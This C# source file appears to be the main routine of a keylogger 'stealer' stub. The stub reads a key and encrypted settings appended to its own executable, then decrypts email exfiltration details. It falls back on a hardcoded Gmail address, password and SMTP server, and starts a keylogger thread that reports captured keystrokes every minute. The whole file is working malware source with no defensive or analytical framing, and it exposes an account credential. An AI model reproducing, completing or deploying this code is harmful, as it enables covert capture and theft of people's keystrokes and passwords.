using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using sub.Stealers;
using sub.Util.Encryption;

namespace sub
{
    class Program
    {
        static void Main()
        {
            byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
            //filedata|split|appendData
            string appendData = Encoding.ASCII.GetString(stub).Split(new string[] { Settings.Splitter }, StringSplitOptions.None)[1];

            //keyPart1|lilsplit|encryptedSettings|lilsplit|keyPart2
            string[] firstCycle = appendData.Split(new string[] {Settings.LittleSplitter}, StringSplitOptions.None);
            string key = firstCycle[0] + firstCycle[2];
            string encryptedSettings = firstCycle[1];
            SimpleAES decryptor = new SimpleAES(key);
            string[] decryptedSettings = decryptor.DecryptString(encryptedSettings).Split(new string[] { Settings.LittleSplitter }, StringSplitOptions.None);
            /*
                Settings.EmailAddress = decryptedSettings[0];
                Settings.EmailPassword = "decryptedSettings[1];
                Settings.SmtpAddress = decryptedSettings[2];
                Settings.SmtpPort = decryptedSettings[3];
             */
            //There needs to be code here that parses the settings into
            //These fields, but for now here is some test data
            Settings.EmailAddress = "sexmongrel69@gmail.com";
            Settings.EmailPassword = "omglawls";
            Settings.SmtpAddress = "smtp.gmail.com";
            Settings.SmtpPort = 587;

            Variables.Mutex = new Mutex(false, Variables.MutexID, out Variables.CreatedMutex);
            StealerThread logger = new StealerThread(new Keylogger());    
            logger.Start(1); //Starts a Keylogger that reports every 1 minute
        }
    }
}
